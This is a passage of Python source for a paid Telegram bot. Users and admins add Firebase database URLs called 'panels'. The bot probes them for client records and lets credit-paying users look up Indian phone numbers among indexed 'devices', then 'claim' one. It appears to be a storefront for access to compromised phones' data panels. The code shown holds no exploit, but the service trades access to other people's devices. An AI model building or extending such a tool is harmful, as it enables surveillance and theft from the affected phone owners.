        a = re.sub(r"\D", "", text)
        if len(a) != 10 or a[0] not in "6789":
            send(cid, "❌ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ 10-ᴅɪɢɪᴛ ɴᴜᴍʙᴇʀ.")
            mode[uid] = "search"
            return
        if not has_access(uid):
            access_required_page(cid, uid)
            return
        typing(cid)
        msg = send(cid, f"{sec('🔍', 'ꜱᴇᴀʀᴄʜɪɴɢ')}\n{DIV}\n\n{emo('🔍')} <code>{fmt_phone(a)}</code> — ꜱᴄᴀɴɴɪɴɢ...")
        mid = msg["result"]["message_id"] if msg and msg.get("ok") else None
        ensure_user_fbs(uid)
        idx = devices_index(uid)
        hits = [d for d in idx if d["phone"] == a]
        if not hits:
            refresh_pool(user_fbs(uid))
            idx = devices_index(uid)
            hits = [d for d in idx if d["phone"] == a]
        if not hits:
            txt = f"{sec('👻', 'ɴᴏᴛ ꜰᴏᴜɴᴅ')}\n{DIV}\n\n{emo('🔍')} <code>{fmt_phone(a)}</code> ɴᴏᴛ ꜰᴏᴜɴᴅ." + footer()
            kb = buttons([[btn("sᴇᴀʀᴄʜ ᴀɢᴀɪɴ", "search", style="primary")], [b_back()]])
            if mid: edit(cid, mid, txt, kb)
            else:   send(cid, txt, kb)
            return
        hits.sort(key=lambda d: (0 if d["online"] else 1, -learned_ts.get((d["url"], d["cid"]), 0)))
        d = hits[0]
        claim_device(uid, d)
        state.setdefault(uid, {})["dev"] = d
        txt, kb = dev_card(d, "ʏᴏᴜʀ ɴᴜᴍʙᴇʀ" if d["online"] else "ɴᴜᴍʙᴇʀ ꜰᴏᴜɴᴅ")
        if mid: edit(cid, mid, txt, kb)
        else:   send(cid, txt, kb)
        return

    if m == "addfb":
        url = text.strip().rstrip("/")
        if not re.match(r"^https://[a-z0-9][a-z0-9-]*(-[a-z0-9]+)*(-default-rtdb)?\.(firebaseio\.com|firebasedatabase\.app)/?$", url + "/"):
            send(cid, "❌ Invalid firebase URL.")
            mode[uid] = "addfb"
            return
        typing(cid)
        wait = send(cid, f"{sec('⏳', 'ᴄʜᴇᴄᴋɪɴɢ')}\n{DIV}\n\n{emo('🔗')} ᴘʀᴏʙɪɴɢ...")
        clients, err = fetch_clients(url)
        if not clients:
            if wait and wait.get("ok"):
                edit(cid, wait["result"]["message_id"],
                     f"{sec('❌', 'ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴛ ᴡᴏʀᴋɪɴɢ')}\n{DIV}\n\nᴇʀʀᴏʀ: <code>{esc(err or 'no data')}</code>" + footer(),
                     buttons([[b_back()]]))
            return
        with fb_lock:
            fb_cache[url] = {"clients": _slim_clients(clients), "t": time.time(), "ok": True}
        try:
            sync_users.update_one({"_id": uid}, {"$addToSet": {"fbs": url}}, upsert=True)
            if uid in user_cache:
                user_cache[uid].setdefault("fbs", []).append(url)
        except Exception:
            pass
        if wait and wait.get("ok"):
            edit(cid, wait["result"]["message_id"],
                 f"{sec('✅', 'ꜰɪʀᴇʙᴀꜱᴇ ᴀᴅᴅᴇᴅ')}\n{DIV}\n\n"
                 f"{emo('🔗')} <code>{esc(url[:60])}</code>\n"
                 f"{emo('🔒')} ᴘʀɪᴠᴀᴛᴇ — ᴏɴʟʏ ʏᴏᴜ." + footer(),
                 buttons([[btn("ꜰɪɴᴅ ɴᴜᴍʙᴇʀ", "getnum", style="success")], [b_back()]]))
        return

    if m == "adm_chadd" and is_adm(uid):
        parts = [p.strip() for p in text.split("|")]
        if len(parts) < 2:
            send(cid, "❌ Format: <code>Name | ID | URL</code>")
            mode[uid] = "adm_chadd"
            return
        label = parts[0]
        try:
            ch_id = int(parts[1])
        except ValueError:
            send(cid, "❌ Invalid channel ID.")
            return
        is_private = False
        url = ""
        if len(parts) >= 3:
            u3 = parts[2]
            if u3.lower() == "private":
                is_private = True
                try:
                    r = api("createChatInviteLink", chat_id=ch_id)
                    if r and r.get("ok"):
                        url = r["result"].get("invite_link", "")
                except Exception:
                    pass
            else:
                url = u3
        with channel_lock:
            force_channels.append({
                "label": label, "id": ch_id, "url": url,
                "private": is_private,
                "invite_link": url if is_private else ""
            })
            save_channels()
        try:
            r = api("getChatMember", chat_id=ch_id, user_id=api("getMe")["result"]["id"])
            if not (r and r.get("ok") and r["result"].get("status") in _JOINED_STATES):
                send(cid, f"⚠️ Channel <b>{esc(label)}</b> added, but bot may lack admin rights. Add bot as admin to enable per-channel checks.",
                     buttons([[b_back("adm_channels")]]))
                return
        except Exception:
            pass
        send(cid, f"✅ Channel <b>{esc(label)}</b> added.", buttons([[b_back("adm_channels")]]))
        return

    if m == "adm_facustom" and is_adm(uid):
        t = text.strip().lower()
        hours = 0
        if t.endswith("h"):
            try:
                hours = int(t[:-1])
            except ValueError:
                hours = 0
        elif t.endswith("day") or t.endswith("d"):
            num = t.replace("day", "").replace("d", "").strip()
            try:
                hours = int(num) * 24
            except ValueError:
                hours = 0
        if hours <= 0 or hours > 8760:
            send(cid, "❌ Invalid duration. Use like <code>5h</code> or <code>2day</code>.")
            mode[uid] = "adm_facustom"
            return
        count = apply_free_access(hours)
        send(cid, f"{sec('🎁', 'ꜰʀᴇᴇ ᴀᴄᴄᴇꜱꜱ ɢʀᴀɴᴛᴇᴅ')}\n{DIV}\n\n"
                  f"{emo('✅')} Duration: <b>{hours}h</b>\n"
                  f"{emo('👤')} Users: <b>{count}</b>" + footer(),
             buttons([[b_back("adm")]]))
        return

    if m == "adm_addcredits" and is_adm(uid):
        parts = text.strip().split()
        if len(parts) != 2:
            send(cid, "❌ Format: <code>USER_ID CREDITS</code>")
            mode[uid] = "adm_addcredits"
            return
        target_id, credits_str = parts
        if not target_id.isdigit():
            send(cid, "❌ Invalid user ID.")
            return
        try:
            amount = int(credits_str)
        except ValueError:
            send(cid, "❌ Invalid credit amount.")
            return
        try:
            r = sync_users.update_one({"_id": target_id}, {"$inc": {"credits": amount}}, upsert=True)
            refresh_user_cache(target_id)
            send(int(target_id),
                 f"{sec('💰', 'ᴄʀᴇᴅɪᴛꜱ ᴀᴅᴅᴇᴅ')}\n{DIV}\n\n"
                 f"{emo('✅')} +{amount} credits added by admin!" + footer())
            send(cid, f"✅ Added {amount} credits to <code>{target_id}</code>.")
        except Exception as e:
            send(cid, f"❌ Error: {e}")
        return

    if m == "adm_addfb" and is_adm(uid):
        found = [mm.group(0).rstrip("/") for mm in
                 re.finditer(r"https://[^\s<>\"']+\.(?:firebaseio\.com|firebasedatabase\.app)", text, re.IGNORECASE)]
        with fb_list_lock:
            have = set(GLOBAL_FB_LIST)
        seen, uniq = set(), []
        for u0 in found:
            if u0 not in seen and u0 not in have:
                seen.add(u0)
                uniq.append(u0)
        if not uniq:
            send(cid, "❌ No new valid URLs found.")
            mode[uid] = "adm_addfb"
            return
        wait = send(cid, f"{sec('⏳', 'ᴄʜᴇᴄᴋɪɴɢ')}\n{DIV}\n\n{emo('🔍')} ᴘʀᴏʙɪɴɢ <b>{len(uniq)}</b> ɴᴇᴡ ᴘᴀɴᴇʟs...")
        res = list(JOB_POOL.map(lambda x: (x, fetch_clients(x)[0]), uniq))
        added, dead = [], []
        with fb_list_lock:
            for x, cl in res:
                if isinstance(cl, dict) and cl:
                    GLOBAL_FB_LIST.append(x)
                    added.append(x)
                else:
                    dead.append(x)
        for x in added:
            refresh_fb(x)
        if wait and wait.get("ok"):
            edit(cid, wait["result"]["message_id"],
                 f"{sec('✅', 'ᴀᴅᴅ ꜰʙ ʀᴇsᴜʟᴛ')}\n{DIV}\n\n"
                 f"{emo('✅')} ᴀᴅᴅᴇᴅ: <b>{len(added)}</b>"
                 + (f"\n{emo('💀')} ꜱᴋɪᴘᴘᴇᴅ: {len(dead)}" if dead else "")
                 + f"\n\n{emo('📊')} ᴛᴏᴛᴀʟ ᴘᴀɴᴇʟs: <b>{len(GLOBAL_FB_LIST)}</b>" + footer(),
                 buttons([[b_back("adm")]]))
        return

    if m == "adm_video" and is_adm(uid):
        t = text.strip().lower()
        if t in ("done", "ᴅᴏɴᴇ"):
            vidq = state.get(uid, {}).get("vidq", [])
            if not vidq:
                send(cid, "Queue empty.", buttons([[b_back("adm")]]))
                return
            VIDEO_DIR.mkdir(exist_ok=True)
            okc = 0
            for fid, fname in vidq:
                try:
                    r = api("getFile", file_id=fid)
                    fp = r["result"]["file_path"] if r and r.get("ok") else None
                    if not fp:
                        continue
                    resp = sess.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{fp}", timeout=300)
                    data = resp.content if resp.status_code == 200 else b""
                    if len(data) < 10240:
                        continue
                    name = re.sub(r"[^A-Za-z0-9._-]", "_", str(fname or "")).strip("._")
                    if not name.lower().endswith(".mp4"):
                        name = (name or f"vid_{int(time.time())}_{okc}") + ".mp4"
                    (VIDEO_DIR / name).write_bytes(data)
                    okc += 1
                except Exception:
                    pass
            state[uid]["vidq"] = []
            send(cid, f"✅ Added {okc} videos.", buttons([[b_back("adm")]]))
        elif t in ("cancel", "ᴄᴀɴᴄᴇʟ"):
            state.setdefault(uid, {})["vidq"] = []
            send(cid, "❌ Cancelled.", buttons([[b_back("adm")]]))
        return

    if m == "adm_bcast" and is_adm(uid):
        targets = list(sync_users.find({}, {"_id": 1, "banned": 1}))
        targets = [int(t["_id"]) for t in targets if not t.get("banned")]
        ok = 0
        for t in targets:
            if send(t, text):
                ok += 1
            time.sleep(0.05)
        send(cid, f"✅ Broadcast sent to {ok}/{len(targets)} users.")
        return

    if m == "adm_bcu" and is_adm(uid):
        tid = text.strip()
        if not tid.isdigit():
            send(cid, "❌ Invalid ID.")
            return
        if send(int(tid), text):
            send(cid, "✅ Message sent.")
        else:
            send(cid, "❌ Failed.")
        return

    if m == "adm_addadm" and is_adm(uid):
        a = text.strip()
        if not a.isdigit():
            send(cid, "❌ Invalid ID.")
            return
        extra_admins.add(int(a))
        _save_adms()
        send(cid, f"✅ <code>{a}</code> is now admin.")
        return

    if m == "adm_rmadm" and is_adm(uid):
        a = text.strip()
        if not a.isdigit():
            return
        if int(a) in ADMIN_IDS:
            send(cid, "❌ Can't remove owner.")
            return
        extra_admins.discard(int(a))
        _save_adms()
        send(cid, f"✅ <code>{a}</code> removed from admins.")
        return

    if m == "adm_ban" and is_adm(uid):
        a = text.strip()
        try:
            sync_users.update_one({"_id": a}, {"$set": {"banned": True}}, upsert=True)
            send(cid, f"✅ User <code>{a}</code> banned.")
        except Exception as e:
            send(cid, f"❌ Error: {e}")
        return

    if m == "adm_unban" and is_adm(uid):
        a = text.strip()
        try:
            sync_users.update_one({"_id": a}, {"$set": {"banned": False}}, upsert=True)
            send(cid, f"✅ User <code>{a}</code> unbanned.")
        except Exception as e:
            send(cid, f"❌ Error: {e}")
        return

    if m == "adm_user" and is_adm(uid):
        a = text.strip()
        v = sync_users.find_one({"_id": a})
        if v:
            send(cid, f"{sec('👤', 'ᴜsᴇʀ ɪɴꜰᴏ')}\n{DIV}\n\n"
                      f"{emo('🆔')} <b>ɪᴅ:</b> <code>{esc(a)}</code>\n"
                      f"{emo('👤')} <b>ɴᴀᴍᴇ:</b> {esc(v.get('n') or '—')}\n"
                      f"{emo('🔗')} <b>ᴜsᴇʀɴᴀᴍᴇ:</b> {'@' + esc(v['u']) if v.get('u') else '—'}\n"
                      f"{emo('💰')} <b>ᴄʀᴇᴅɪᴛs:</b> {v.get('credits', 0)}\n"
                      f"{emo('⚡')} <b>ᴀᴄᴄᴇꜱꜱ ᴜɴᴛɪʟ:</b> {fmt_ist(v.get('access_until', 0))}\n"
                      f"{emo('💎')} <b>ʟɪꜰᴇᴛɪᴍᴇ:</b> {'Yes' if v.get('lifetime') else 'No'}\n"
                      f"{emo('🤝')} <b>ʀᴇꜰᴇʀs:</b> {len(v.get('refs', []))}\n"
                      f"{emo('📌')} <b>ᴘᴀɴᴇʟs:</b> {len(v.get('fbs', []))}\n"
                      f"{emo('🚫')} <b>ʙᴀɴɴᴇᴅ:</b> {'Yes' if v.get('banned') else 'No'}\n"
                      f"{emo('📅')} <b>ᴊᴏɪɴᴇᴅ:</b> {esc(v.get('j', '—'))}" + footer())
        else:
            send(cid, "❌ User not found.")
        return

    send_home(cid, uid, u)

# ══════════════════════════════════════════════════════════════
#  MESSAGE PROCESSOR
# ══════════════════════════════════════════════════════════════

OFFS = None
_off_lock = threading.Lock()

def get_updates():
    global OFFS
    with _off_lock:
        cur = OFFS
    try:
        r = sess.get(f"{TG}/getUpdates", params={
            "offset": cur if cur is not None else 0,
            "timeout": 25,
            "limit": 100,
            "allowed_updates": '["message","callback_query","channel_post"]'
        }, timeout=35)
        if r.status_code != 200:
            log.warning(f"getUpdates HTTP {r.status_code}")
            return []
        j = r.json()
        if not j.get("ok"):
            log.warning(f"getUpdates not ok: {j.get('description')}")
            return []
        return j.get("result", []) or []
    except Exception as e:
        log.warning(f"getUpdates exception: {e}")
        return []

def _handle_payment_photo(u, cid, file_id):
    uid = str(u["id"])
    pend = get_pending_payment(uid)
    if not pend:
        send(cid, f"{sec('ℹ️', 'ɴᴏ ᴘᴇɴᴅɪɴɢ ᴘᴀʏᴍᴇɴᴛ')}\n{DIV}\n\n"
                  f"Choose a package first from BUY CREDITS, then send the screenshot.",
             buttons([[btn("BUY CREDITS", "buy_credits", style="success")], [b_back()]]))
        return
    pkg = pend.get("pkg", "")
    pkg_info = BUY_PACKAGES.get(pkg, {})
    try:
        sync_pending.update_one(
            {"_id": uid, "status": "awaiting_ss"},
            {"$set": {"screenshot_file_id": file_id, "status": "submitted",
                      "submitted_ts": time.time()}}
        )
    except Exception as e:
        log.error(f"payment photo save: {e}")

    send(cid, f"{sec('✅', 'ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ʀᴇᴄᴇɪᴠᴇᴅ')}\n{DIV}\n\n"
              f"{emo('⏳')} Admin will verify and approve shortly.", buttons([[b_back()]]))

    cap = (f"💳 <b>New Payment Screenshot</b>\n\n"
           f"{emo('👤')} Name: {esc(u.get('first_name') or '—')}\n"
           f"{emo('🔗')} Username: @{esc(u.get('username') or '—')}\n"
           f"{emo('🆔')} User ID: <code>{uid}</code>\n"
           f"{emo('📦')} Package: {esc(pkg_info.get('label', pkg))}\n"
           f"{emo('💵')} Amount: ₹{pkg_info.get('price', 0)}\n\n"
           f"Approve or Reject:")
    for admin_id in ADMIN_IDS | extra_admins:
        try:
            api("sendPhoto", chat_id=admin_id, photo=file_id, caption=cap,
                parse_mode="HTML",
                reply_markup=buttons([
                    [btn("✅ Approve", f"ss_appr_{uid}", style="success")],
                    [btn("❌ Reject", f"ss_rej_{uid}", style="danger")],
                ]))
        except Exception as e:
            log.error(f"forward payment photo to {admin_id}: {e}")

def process(upd):
    try:
        if "callback_query" in upd:
            q = upd["callback_query"]
            u = q.get("from") or {}
            msg = q.get("message") or {}
            cid = msg.get("chat", {}).get("id")
            mid = msg.get("message_id")
            data = q.get("data", "")
            if not cid or not u:
                return
            uid = str(u["id"])
            ud = get_user_db(uid)
            if ud and ud.get("banned"):
                answer_cb(q["id"], "🚫 You are banned.")
                return
            handle_cb(u, cid, data, q["id"], mid=mid)
            return

        if "message" in upd:
            msg = upd["message"]
            u = msg.get("from") or {}
            if not u or u.get("is_bot"):
                return
            cid = msg["chat"]["id"]
            uid = str(u["id"])
            ud = get_user_db(uid)
            if ud and ud.get("banned"):
                return

            photo = msg.get("photo")
            document = msg.get("document")
            image_fid = None
            if photo:
                image_fid = photo[-1]["file_id"]
            elif document and str(document.get("mime_type", "")).startswith("image/"):
                image_fid = document.get("file_id")

            if image_fid:
                if mode.get(uid) == "adm_qr" and is_adm(uid):
                    mode.pop(uid, None)
                    sync_settings.update_one({"_id": "qr_photo"},
                                             {"$set": {"file_id": image_fid}}, upsert=True)
                    send(cid, "✅ QR Code Photo saved successfully!", buttons([[b_back("adm")]]))
                    return
                _handle_payment_photo(u, cid, image_fid)
                return

            vid = msg.get("video")
            doc = msg.get("document")
            if doc and str(doc.get("mime_type", "")).startswith("video/"):
                vid = doc
            if vid and mode.get(uid) == "adm_video" and is_adm(uid):
                q = state.setdefault(uid, {}).setdefault("vidq", [])
                q.append((vid.get("file_id"), vid.get("file_name") or ""))
                send(cid, f"{sec('📥', 'ǫᴜᴇᴜᴇᴅ')}\n{DIV}\n\n"
                          f"{emo('📱')} Video queued ({len(q)}). Send more, or type <code>done</code>.",
                     buttons([[b_back("adm")]]))
                return

            text = msg.get("text") or msg.get("caption") or ""
            if text:
                handle_text(u, cid, text)
            return
    except Exception:
        log.exception("process")

# ══════════════════════════════════════════════════════════════
#  MAIN LOOP
# ══════════════════════════════════════════════════════════════

def main():
    global OFFS
    _load_adms()
    load_channels()
    DATA.mkdir(exist_ok=True)
    VIDEO_DIR.mkdir(exist_ok=True)

    threading.Thread(target=run_web_server, daemon=True).start()
    threading.Thread(target=refresh_loop, daemon=True).start()
    threading.Thread(target=renew_private_links, daemon=True).start()

    try:
        boot = sess.get(f"{TG}/getUpdates",
                        params={"offset": 0, "timeout": 0, "limit": 1},
                        timeout=15).json()
        if boot.get("ok") and boot.get("result"):
            OFFS = boot["result"][-1]["update_id"] + 1
            try:
                sess.get(f"{TG}/getUpdates",
                         params={"offset": OFFS, "timeout": 0, "limit": 1},
                         timeout=10)
            except Exception:
                pass
            log.info(f"Bootstrap: skipped backlog up to update_id {OFFS - 1}")
    except Exception as e:
        log.warning(f"bootstrap failed: {e}")

    log.info(f"⚡ {BOT_NAME} started")
    while True:
        try:
            updates = get_updates()
            if updates:
                new_off = updates[-1]["update_id"] + 1
                with _off_lock:
                    OFFS = new_off
                try:
                    sess.get(f"{TG}/getUpdates",
                             params={"offset": new_off, "timeout": 0, "limit": 1},
                             timeout=10)
                except Exception:
                    pass
                for upd in updates:
                    try:
                        process(upd)
                    except Exception:
                        log.exception("process failed")
            else:
                time.sleep(1.0)
        except Exception:
            log.exception("main loop")
            time.sleep(2.0)

if __name__ == "__main__":
    main()
